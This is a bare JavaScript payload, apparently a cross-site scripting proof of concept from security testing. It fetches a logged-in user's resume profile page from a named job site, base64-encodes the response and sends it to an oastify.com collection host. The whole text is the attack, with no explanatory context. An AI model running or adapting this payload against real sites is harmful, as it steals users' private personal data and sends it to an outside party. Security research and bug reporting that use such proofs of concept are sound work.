var xhr  = new XMLHttpRequest();
xhr.open('GET', 'https://job.inshokuten.com/member/resume/profile', false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://pe72mwfoexb0vbncnd77uk380z6quim6b.oastify.com/?r=" + btoa(xhr.responseText), false);
exfil.send();
